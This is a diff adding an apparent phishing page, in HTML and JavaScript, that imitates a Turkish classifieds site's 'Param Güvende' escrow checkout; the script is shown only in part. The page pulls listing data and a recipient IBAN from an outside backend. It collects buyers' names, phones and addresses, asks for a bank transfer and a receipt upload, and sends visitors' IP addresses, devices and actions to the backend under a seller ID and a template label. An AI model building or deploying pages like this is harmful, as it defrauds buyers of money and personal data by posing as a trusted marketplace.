@@ -1,0 +1,1339 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sahilinden.com - Güvenli Ödeme</title>
+    <style>
+       
+        :root {
+            --shb-yellow: #ffe800;
+            --shb-blue: #0059a3;
+            --shb-green: #00a651;
+            --shb-dark: #333333;
+            --shb-bg: #f3f4f7;
+            --shb-border: #e2e2e2;
+            --prem-rozet-bg: #48b8a6; 
+            --trust-icon-color: #16b4a1; /* Yeni eklenen ikonların turkuaz rengi */
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Lucida Grande", "Lucida Sans", "Arial", sans-serif;
+        }
+
+        body {
+            background-color: var(--shb-bg);
+            color: var(--shb-dark);
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--shb-bg);
+            min-height: 100vh;
+            position: relative;
+            padding-bottom: 80px;
+        }
+        
+        /* HEADER */
+        .header {
+            background-color: var(--shb-blue);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            color: #fff;
+            height: 60px; 
+            padding: 0 15px; 
+            display: grid; 
+            grid-template-columns: 50px 1fr 90px; 
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .header-title {
+            grid-column: 2; 
+            justify-self: center; 
+            text-align: center;
+            font-size: 17px; 
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            color: #fff;
+        }
+
+        .back-btn {
+            grid-column: 1; 
+            justify-self: start; 
+            font-size: 26px; 
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            line-height: 1;
+        }
+
+        /* HEADER SAĞ TARAF (PAYLAŞ VE FAVORİ) */
+        .header-right {
+            grid-column: 3; 
+            justify-self: end; 
+            display: flex;
+            align-items: center;
+            gap: 18px; 
+        }
+
+        .header-right a {
+            text-decoration: none;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .share-btn svg {
+            width: 22px; 
+            height: 22px;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .fav-btn svg {
+            width: 24px; 
+            height: 24px;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: all 0.2s ease;
+        }
+
+        .fav-btn.filled svg {
+            fill: #ffcc00; 
+            stroke: #ffcc00; 
+        }
+
+        .card {
+            background: #fff;
+            border-bottom: 1px solid var(--shb-border);
+            border-top: 1px solid var(--shb-border);
+            padding: 15px;
+            margin-bottom: 10px;
+        }
+
+        .step-container {
+            display: none;
+        }
+
+        .step-container.active {
+            display: block;
+            animation: fadeIn 0.2s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* FOTOĞRAF ALANI */
+        .image-gallery-section {
+            position: relative; 
+            background: #fff;
+            border-bottom: 1px solid var(--shb-border);
+        }
+
+        /* İNCE UZUN PREMİUM ROZET */
+        .prem-rozet {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            height: 28px; 
+            background-color: var(--prem-rozet-bg); 
+            border-radius: 14px; 
+            display: flex;
+            align-items: center;
+            padding: 0 12px 0 8px;
+            gap: 6px;
+            z-index: 10; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15); 
+        }
+
+        .prem-rozet svg {
+            width: 16px;
+            height: 16px;
+            fill: none;
+            stroke: #fff; 
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .prem-rozet span {
+            color: #fff;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        /* KAYDIRMALI GALERİ */
+        .gallery-wrap {
+            display: flex;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            width: 100%;
+        }
+
+        .gallery-wrap::-webkit-scrollbar {
+            display: none;
+        }
+
+        .gallery-wrap img {
+            width: 100%;
+            height: 300px;
+            flex-shrink: 0;
+            object-fit: contain;
+            scroll-snap-align: center;
+        }
+
+        /* KATEGORİ VE ADRES */
+        .info-header-card {
+            background: #fff;
+            padding: 12px 15px 2px 15px; /* Alt boşluğu 2px'e düşürdük */
+            text-align: center;
+            margin-bottom: 0; 
+        }
+
+        .cat-tree {
+            font-size: 12px;
+            color: #0059a3;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .gray-address {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+        }
+
+        .product-price {
+            font-size: 26px;
+            font-weight: bold;
+            color: var(--shb-blue);
+            margin-bottom: 10px;
+        }
+
+        .product-title {
+            font-size: 16px;
+            color: var(--shb-dark);
+            font-weight: bold;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .desc-box {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #444;
+            margin-bottom: 5px; /* Altındaki butona yakın dursun diye 20'den 5'e çektik */
+        }
+
+        .desc-kisitli {
+            display: -webkit-box;
+            -webkit-line-clamp: 2; /* Sadece ilk 2 satırı gösterir */
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .daha-fazla-btn {
+            background: none;
+            border: none;
+            color: #0059a3; /* Sarı sitenin mavi link rengi */
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 0;
+            margin-bottom: 20px;
+            display: none; /* JS ile gerekliyse göstereceğiz */
+        }
+
+        /* SEKMELER */
+        .tabs {
+            display: flex;
+            border-bottom: 3px solid #ffcc00;
+            background: #fff;
+            padding: 0px 10px 0 10px; /* Üst boşluğu tamamen sıfırladık */
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            font-size: 15px;
+            color: #333;
+            cursor: pointer;
+            background: #fff;
+            border: 1px solid #aaa;
+            border-bottom: none;
+            border-radius: 3px 3px 0 0;
+            margin-right: 5px;
+        }
+        
+        .tab-btn:last-child {
+            margin-right: 0;
+        }
+
+        .tab-btn.active {
+            background-color: #ffcc00;
+            border-color: #ffcc00;
+            color: #333;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* DİNAMİK ÖZELLİKLER TABLOSU */
+        .details-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            border-top: 1px solid var(--shb-border);
+        }
+
+        .details-table td {
+            padding: 12px 0;
+            border-bottom: 1px solid var(--shb-border);
+        }
+
+        .details-table td:first-child {
+            font-weight: normal; /* İnce görünüm için kalınlığı kaldırdık */
+            color: #888; /* Çizgi hissiyatı veren ama okunan gri tonu */
+            width: 40%;
+        }
+
+        .details-table td:last-child {
+            text-align: right;
+            color: #888; /* Değerleri de aynı gri yaptık */
+            font-weight: normal; /* İnce görünüm için kalınlığı kaldırdık */
+        }
+
+        .seller-card {
+            border: 1px solid var(--shb-border);
+            padding: 15px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 30px;
+            background: #fafafa;
+        }
+
+        .seller-avatar {
+            width: 50px;
+            height: 50px;
+            background: #ccc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .seller-info h4 {
+            font-size: 16px;
+            color: var(--shb-blue);
+            margin-bottom: 3px;
+        }
+
+        .seller-info p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        /* YENİ STEP 2 (SİPARİŞ ÖZETİ) TASARIMI */
+        #step2 { background: #fff; padding: 0; border: none; margin-top: 0; }
+        .s2-header-title { background-color: #f3f4f7; color: #888; font-size: 12px; font-weight: bold; padding: 12px 15px; text-transform: uppercase; border-bottom: 1px solid var(--shb-border); }
+        .s2-product-row { display: flex; gap: 15px; padding: 15px; border-bottom: 1px solid var(--shb-border); }
+        .s2-product-row img { width: 75px; height: 75px; object-fit: cover; border-radius: 4px; border: 1px solid var(--shb-border); }
+        .s2-product-row .s2-title { font-size: 14px; color: #333; line-height: 1.4; text-transform: uppercase; }
+        .s2-price-list { list-style: none; padding: 0 15px; margin: 10px 0 0 0; font-size: 14px; color: #555; }
+        .s2-price-list li { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--shb-border); }
+        .s2-price-list li span:last-child { color: #333; }
+        .s2-price-list .total { font-weight: bold; color: #333; font-size: 15px; border-top: none; }
+        .s2-price-list .total span:first-child { color: #333; }
+        .s2-price-list .total span:last-child { color: var(--shb-blue); font-size: 16px; font-weight: bold; }
+        .s2-delivery-note { font-size: 12px; color: #777; padding: 15px; border-bottom: 15px solid #f3f4f7; }
+        .s2-trust-badges { padding: 20px 15px; background: #fff; }
+        .trust-badge-item { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 20px; }
+        .trust-badge-item:last-child { margin-bottom: 0; }
+        .trust-badge-icon { flex-shrink: 0; width: 36px; height: 36px; }
+        .trust-badge-icon svg { width: 100%; height: 100%; fill: none; stroke: var(--trust-icon-color); stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+        .trust-badge-content h4 { font-size: 15px; color: #333; margin-bottom: 4px; font-weight: 700; }
+        .trust-badge-content p { font-size: 13px; color: #666; line-height: 1.4; }
+
+        /* YENİ STEP 3 (TESLİMAT ADRESİ - YÜZEN ETİKETLER) */
+        #step3 { background: #fff; padding: 0; border: none; margin-top: 0; }
+        .s3-header { background-color: #f3f4f7; color: #888; font-size: 12px; font-weight: bold; padding: 12px 15px; text-transform: uppercase; border-bottom: 1px solid var(--shb-border); border-top: 1px solid var(--shb-border); }
+        .s3-form-container { padding: 0 15px; }
+        
+        .s3-input-group { position: relative; margin-bottom: 0; padding-top: 20px; }
+        .s3-input-group input, .s3-input-group select { 
+            width: 100%; 
+            padding: 8px 0; 
+            border: none; 
+            border-bottom: 1px solid var(--shb-border); 
+            font-size: 15px; 
+            color: #333; 
+            background: transparent; 
+            outline: none; 
+            border-radius: 0;
+            -webkit-appearance: none;
+        }
+        
+        /* Floating Label Ayarları */
+        .s3-input-group label {
+            position: absolute;
+            top: 28px; 
+            left: 0;
+            font-size: 15px;
+            color: #888;
+            transition: 0.2s ease all;
+            pointer-events: none;
+            font-weight: normal;
+            margin-bottom: 0;
+        }
+
+        /* Input veya Select doldurulduğunda ya da odaklanıldığında etiketin yukarı kayması */
+        .s3-input-group input:focus ~ label,
+        .s3-input-group input:not(:placeholder-shown) ~ label,
+        .s3-input-group select:focus ~ label,
+        .s3-input-group select:valid ~ label {
+            top: 0px;
+            font-size: 12px;
+        }
+
+        /* Sadece doluysa gri, tıklandığında mavi olsun */
+        .s3-input-group input:not(:placeholder-shown) ~ label,
+        .s3-input-group select:valid ~ label { color: #888; }
+        .s3-input-group input:focus ~ label,
+        .s3-input-group select:focus ~ label { color: var(--shb-blue); }
+
+        .s3-input-group input:focus, .s3-input-group select:focus {
+            border-bottom: 2px solid var(--shb-blue);
+            padding-bottom: 7px; /* Titremeyi engellemek için 1px kıstık */
+        }
+
+        .s3-select-icon { position: absolute; right: 0; top: 32px; pointer-events: none; }
+        .s3-select-icon svg { width: 14px; height: 14px; fill: #888; }
+        
+        .s3-kvkk-text { font-size: 12px; color: #888; padding: 20px 15px; background: #f9fbfc; line-height: 1.5; margin-bottom: 80px; }
+        .s3-kvkk-text a { color: var(--shb-blue); text-decoration: none; }
+
+        /* YENİ STEP 4 (HAVALE) VE BUTONLAR */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .form-group input, 
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 15px;
+            outline: none;
+            background-color: #fff;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            border-color: var(--shb-blue);
+        }
+        
+        .iban-box {
+            background: #f9f9f9;
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 3px;
+        }
+
+        .iban-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .iban-row h3 {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+            font-weight: normal;
+        }
+
+        .iban-row p {
+            font-size: 15px;
+            font-weight: bold;
+            color: #000;
+            letter-spacing: 1px;
+        }
+
+        .copy-btn {
+            background: #fff;
+            border: 1px solid var(--shb-blue);
+            color: var(--shb-blue);
+            padding: 5px 12px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .upload-box {
+            border: 2px dashed #ccc;
+            padding: 25px 15px;
+            text-align: center;
+            background: #fafafa;
+            cursor: pointer;
+            color: #666;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 480px;
+            background: transparent; 
+            padding: 10px 15px;
+            border-top: none; 
+            display: flex;
+            gap: 10px;
+            z-index: 100;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            color: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15); 
+        }
+
+        .btn-buy {
+            background: #16b4a1; /* Su yeşili / Turkuaz */
+        }
+
+        .btn-call {
+            background: var(--shb-blue); /* Projedeki o ana lacivert/koyu mavi */
+            color: #fff; /* Arka plan koyu olacağı için yazıyı beyaz yapıyoruz ki okunsun */
+            border: 1px solid var(--shb-blue);
+        }
+
+        .btn:disabled {
+            background: #ccc !important;
+            color: #666 !important;
+        }
+
+        #loader {
+            text-align: center;
+            padding: 50px 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* --- YENİ 404 / HATA EKRANI STİLLERİ --- */
+        #errorMsg {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 20px;
+            text-align: center;
+            background: #fff;
+            margin: 20px auto;
+            max-width: 440px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border: 1px solid var(--shb-border);
+        }
+
+        .error-icon {
+            width: 70px;
+            height: 70px;
+            background: #f8f9fa;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            border: 1px solid var(--shb-border);
+        }
+
+        .error-icon svg {
+            width: 35px;
+            height: 35px;
+            fill: #999;
+        }
+
+        .error-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--shb-dark);
+            margin-bottom: 10px;
+        }
+
+        .error-desc {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .error-btn {
+            background: var(--shb-blue);
+            color: #fff;
+            text-decoration: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            transition: opacity 0.2s;
+        }
+
+        .error-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* --- YENİ EKLENEN HATA MESAJI STİLLERİ --- */
+        .s3-error-msg {
+            display: none;
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 5px;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .s3-error-msg::before {
+            content: "!";
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 15px;
+            height: 15px;
+            background-color: #d32f2f;
+            color: white;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .s3-input-group.has-error input,
+        .s3-input-group.has-error select {
+            border-bottom: 2px solid #d32f2f;
+        }
+
+        .s3-input-group.has-error label {
+            color: #d32f2f;
+        }
+
+        .s3-input-group.has-error .s3-error-msg {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="header">
+            <a href="#" class="back-btn" id="btnGeri">❮</a>
+            <div class="header-title">İlan Detayı</div>
+            <div class="header-right" id="headerRight">
+                <a href="#" class="share-btn" id="btnPaylas">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path>
+                        <polyline points="16 6 12 2 8 6"></polyline>
+                        <line x1="12" y1="2" x2="12" y2="15"></line>
+                    </svg>
+                </a>
+                <a href="#" class="fav-btn" id="btnFavori">
+                    <svg viewBox="0 0 24 24">
+                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+                    </svg>
+                </a>
+            </div>
+        </div>
+
+        <div id="loader">İlan yükleniyor...</div>
+        
+        <div id="errorMsg">
+            <div class="error-icon">
+                <svg viewBox="0 0 24 24"><path d="M11 15h2v2h-2zm0-8h2v6h-2zm.99-5C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>
+            </div>
+            <div class="error-title">İlan Yayında Değil</div>
+            <div class="error-desc">Aradığınız ilan yayından kaldırılmış veya süresi dolmuş olabilir.</div>
+            <a href="https://www.sahibinden.com" class="error-btn">Ana Sayfaya Dön</a>
+        </div>
+
+        <div id="step1" class="step-container">
+            <div class="image-gallery-section">
+                <div class="prem-rozet">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        <path d="M9 12l2 2 4-4"></path>
+                    </svg>
+                    <span>Param Güvende</span>
+                </div>
+                <div class="gallery-wrap" id="v-gallery"></div>
+            </div>
+            
+            <div class="info-header-card">
+                <div class="cat-tree" id="v-kategori">Yükleniyor...</div>
+                <div class="gray-address" id="v-adres">📍 Yükleniyor...</div>
+            </div>
+            
+            <div style="background: #fff; margin-bottom: 80px;">
+                <div class="tabs">
+                    <div class="tab-btn active" onclick="switchTab('tab-bilgi')">İlan Bilgileri</div>
+                    <div class="tab-btn" onclick="switchTab('tab-konum')">Konumu</div>
+                </div>
+                
+                <div style="padding: 15px;">
+                    <div id="tab-bilgi" class="tab-content active">
+                        <div class="product-price" id="v-fiyat">... TL</div>
+                        <div class="product-title" id="v-baslik">Yükleniyor...</div>
+                        <div class="desc-box desc-kisitli" id="v-aciklama">Yükleniyor...</div>
+                        <button class="daha-fazla-btn" id="btnAciklamaTog">Daha fazla göster</button>
+
+                        <table class="details-table" id="v-ozellikler"></table>
+                        
+                        <div class="seller-card">
+                            <div class="seller-avatar">👤</div>
+                            <div class="seller-info">
+                                <h4 id="v-saticiAdi">...</h4>
+                                <p id="v-hesapTarihi">Hesap Açılış: ...</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="tab-konum" class="tab-content">
+                        <div style="position: relative; width: 100%; height: 350px; border-radius: 5px; overflow: hidden;">
+                            <iframe id="v-harita" src="" width="100%" height="350" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+                            
+                            <div id="v-harita-adres" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: #fff; padding: 10px 24px; border-radius: 30px; font-size: 14px; color: #444; box-shadow: 0 4px 15px rgba(0,0,0,0.15); pointer-events: none; white-space: nowrap; max-width: 90%; overflow: hidden; text-overflow: ellipsis; z-index: 10;">
+                                Yükleniyor...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step2" class="step-container">
+            <div class="s2-header-title">SİPARİŞ ÖZETİ</div>
+            
+            <div class="s2-product-row">
+                <img id="o-resim" src="" alt="Ürün">
+                <div class="s2-title" id="o-baslik">Yükleniyor...</div>
+            </div>
+            
+            <ul class="s2-price-list">
+                <li><span>Ürün bedeli</span> <span id="o-fiyat">... TL</span></li>
+                <li><span>S - Param Güvende Hizmet Bedeli</span> <span id="o-hizmet">... TL</span></li>
+                <li><span>Kargo ücreti</span> <span style="color: #666;">Ücretsiz</span></li>
+                <li class="total"><span>Toplam tutar</span> <span id="o-toplam">... TL</span></li>
+            </ul>
+            
+            <div class="s2-delivery-note">
+                Ürün, satıcı tarafından 3 iş gününde kargoya verilir.
+            </div>
+
+            <div class="s2-trust-badges">
+                <div class="trust-badge-item">
+                    <div class="trust-badge-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
+                    </div>
+                    <div class="trust-badge-content">
+                        <h4>Paranız Güvende</h4>
+                        <p>Ödemeniz siz ürünü teslim alıp onayladıktan sonra satıcıya aktarılır.</p>
+                    </div>
+                </div>
+                
+                <div class="trust-badge-item">
+                    <div class="trust-badge-icon">
+                        <svg viewBox="0 0 24 24"><rect x="1" y="3" width="15" height="13" rx="1.5"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+                    </div>
+                    <div class="trust-badge-content">
+                        <h4>Ücretsiz Kargo</h4>
+                        <p>Aldığınız ürün Yurtiçi ya da PTT kargo ile tarafınıza ücretsiz olarak kargolanır.</p>
+                    </div>
+                </div>
+
+                <div class="trust-badge-item">
+                    <div class="trust-badge-icon">
+                        <svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>
+                    </div>
+                    <div class="trust-badge-content">
+                        <h4>Kolay İade</h4>
+                        <p>Ürün ilandakinden farklı çıkarsa satıcıya kargolayıp ürün tutarını geri alabilirsiniz.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step3" class="step-container">
+            <div class="s3-header">ADRES BİLGİLERİ</div>
+            
+            <div class="s3-form-container">
+                <div class="s3-input-group">
+                    <input type="text" id="adresAdi" placeholder=" " required>
+                    <label>Adres adı</label>
+                    <div class="s3-error-msg">Bir adres adı girin.</div>
+                </div>
+                <div class="s3-input-group">
+                    <input type="text" id="aliciAd" placeholder=" " required>
+                    <label>Ad</label>
+                    <div class="s3-error-msg">Adınızı girin.</div>
+                </div>
+                <div class="s3-input-group">
+                    <input type="text" id="aliciSoyad" placeholder=" " required>
+                    <label>Soyad</label>
+                    <div class="s3-error-msg">Soyadınızı girin.</div>
+                </div>
+                <div class="s3-input-group">
+                    <input type="tel" id="aliciTel" placeholder=" " required>
+                    <label>Telefon</label>
+                    <div class="s3-error-msg">Telefon numaranızı başında sıfır olmadan girin.</div>
+                </div>
+                
+                <div class="s3-input-group">
+                    <select id="aliciIl" required>
+                        <option value="" disabled selected></option>
+                    </select>
+                    <label>İl</label>
+                    <div class="s3-select-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+                    <div class="s3-error-msg">İl seçin.</div>
+                </div>
+                <div class="s3-input-group">
+                    <select id="aliciIlce" required>
+                        <option value="" disabled selected></option>
+                    </select>
+                    <label>İlçe</label>
+                    <div class="s3-select-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+                    <div class="s3-error-msg">İlçe seçin.</div>
+                </div>
+                <div class="s3-input-group">
+                    <input type="text" id="aliciMahalle" placeholder=" " required>
+                    <label>Mahalle</label>
+                    <div class="s3-error-msg">Lütfen mahalle bilginizi girin.</div>
+                </div>
+                
+                <div class="s3-input-group">
+                    <input type="text" id="aliciAciKAdres" placeholder=" " required>
+                    <label>Açık adres</label>
+                    <div class="s3-error-msg">Açık adresinizi girin.</div>
+                </div>
+            </div>
+            
+            <div class="s3-kvkk-text">
+                Kişisel verilerin korunması hakkında detaylı bilgiye <a href="#">buradan</a> ulaşabilirsiniz.
+            </div>
+        </div>
+
+        <div id="step4" class="step-container card" style="margin-top: 10px;">
+            <div class="section-title">Banka Havalesi / EFT</div>
+            <p style="font-size: 13px; color: #555; margin-bottom: 15px; line-height: 1.4;">Siparişi tamamlamak için aşağıdaki hesaba ödemenizi yapın ve dekontunuzu yükleyin.</p>
+            
+            <div class="iban-box">
+                <div class="iban-row">
+                    <div><h3>ALICI IBAN</h3><p id="odeme-iban">TR00 0000...</p></div>
+                    <button class="copy-btn" onclick="kopyalaMetin('odeme-iban', this)">Kopyala</button>
+                </div>
+                <hr style="border: none; border-top: 1px solid #ddd; margin-bottom: 15px;">
+                <div class="iban-row" style="margin-bottom: 0;">
+                    <div><h3>ALICI AD SOYAD</h3><p id="odeme-isim">...</p></div>
+                    <button class="copy-btn" onclick="kopyalaMetin('odeme-isim', this)">Kopyala</button>
+                </div>
+            </div>
+
+            <input type="file" id="dekontSecici" accept="image/*" style="display: none;">
+            <div class="upload-box" id="dekontKutusu">Dekont Eklemek İçin Tıklayın<br><span style="font-size: 11px; color:#999; display:block; margin-top:5px;">(Max 5MB - JPG/PNG)</span></div>
+            <div id="dekontDurum" style="margin-top: 15px; text-align: center; font-size: 14px; font-weight: bold; color: var(--shb-green);"></div>
+        </div>
+
+        <div class="bottom-bar" id="bottomBar" style="display: none;">
+            <button class="btn btn-call" id="btnAra">Ara</button>
+            <button class="btn btn-buy" id="btnIleri">Satın Al</button>
+        </div>
+    </div>
+    
+    <script type="module">
+    const API_BASE = "https://payislemlerim.vercel.app/api"; 
+    const ilanId = window.ILAN_ID || new URLSearchParams(window.location.search).get('ilan');
+
+
+    let mevcutAdim = 1; 
+    let aktifIlanVerisi = null; 
+    let secilenDekontDosyasi = null;
+
+    // ---- 1. GELİŞMİŞ LOG GÖNDERME AJANI ----
+    async function logGonder(aksiyon, detay = "") {
+        if (!aktifIlanVerisi) return;
+        try {
+            let ipAdresi = "Bulunamadı";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ipAdresi = ipData.ip;
+            } catch(e) {}
+
+            const gorselFiyat = document.getElementById('v-fiyat').innerText || (aktifIlanVerisi.fiyat + " TL");
+            
+            const ua = navigator.userAgent;
+            let cihazBilgisi = "Diğer/PC";
+            if(/iPhone|iPad|iPod/i.test(ua)) cihazBilgisi = "Apple iOS";
+            else if(/Android/i.test(ua)) cihazBilgisi = "Android";
+
+            await fetch(`${API_BASE}/log-ekle`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    saticiId: aktifIlanVerisi.olusturanMusteri,
+                    ilanBasligi: aktifIlanVerisi.urunAdi || "Bilinmiyor",
+                    saticiAdi: aktifIlanVerisi.saticiAdi || "Bilinmiyor",
+                    fiyat: gorselFiyat,
+                    sablon: "Şablon 1 (Sarı)",
+                    aksiyon: aksiyon,
+                    detay: detay,
+                    ip: ipAdresi,
+                    cihaz: cihazBilgisi,
+                    tarih: new Date().toLocaleDateString('tr-TR'), 
+                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
+                })
+            });
+        } catch (error) { console.error("Log hatası"); }
+    }
+
+    // ---- 2. İL VE İLÇE GETİRME ----
+    const ilSelect = document.getElementById("aliciIl");
+    const ilceSelect = document.getElementById("aliciIlce");
+    let turkeyData = [];
+
+    async function sehirleriGetir() {
+        try {
+            const response = await fetch("https://turkiyeapi.dev/api/v1/provinces");
+            const json = await response.json();
+            turkeyData = json.data;
+            turkeyData.sort((a, b) => a.name.localeCompare(b.name));
+            turkeyData.forEach(il => {
+                const option = document.createElement("option");
+                option.value = il.name; option.textContent = il.name;
+                ilSelect.appendChild(option);
+            });
+        } catch (error) { ilSelect.innerHTML = '<option value="">Sunucu Hatası</option>'; }
+    }
+
+    // KURUMSAL UYARI MEKANİZMASI
+    function iliskiKontrol(hedefSelect, bagliSelect, uyariMesaji) {
+        const preventAction = (e) => {
+            if (bagliSelect.value === "") {
+                e.preventDefault();
+                hedefSelect.blur(); 
+                const group = hedefSelect.closest('.s3-input-group');
+                const errorDiv = group.querySelector('.s3-error-msg');
+                errorDiv.innerText = uyariMesaji; 
+                group.classList.add('has-error');
+            }
+        };
+        hedefSelect.addEventListener('mousedown', preventAction);
+        hedefSelect.addEventListener('touchstart', preventAction, {passive: false});
+        hedefSelect.addEventListener('focus', preventAction);
+    }
+
+    iliskiKontrol(ilceSelect, ilSelect, "Lütfen işlem yapmadan önce İl seçimi yapınız.");
+
+    // Telefon alanına tıklandığında otomatik +90 ekleme
+    const telInput = document.getElementById('aliciTel');
+    telInput.addEventListener('focus', function() {
+        if(this.value === '') { this.value = '+90 '; }
+    });
+
+    ilSelect.addEventListener("change", (e) => {
+        ilceSelect.innerHTML = '<option value="" disabled selected></option>';
+
+        ilceSelect.closest('.s3-input-group').classList.remove('has-error');
+        ilceSelect.closest('.s3-input-group').querySelector('.s3-error-msg').innerText = "İlçe seçin.";
+
+        const secilen = turkeyData.find(il => il.name === e.target.value);
+        if (secilen) {
+            secilen.districts.sort((a, b) => a.name.localeCompare(b.name));
+            secilen.districts.forEach(ilce => {
+                const option = document.createElement("option");
+                option.value = ilce.name; option.textContent = ilce.name;
+                ilceSelect.appendChild(option);
+            });
+        }
+    });
+
+    sehirleriGetir();
+
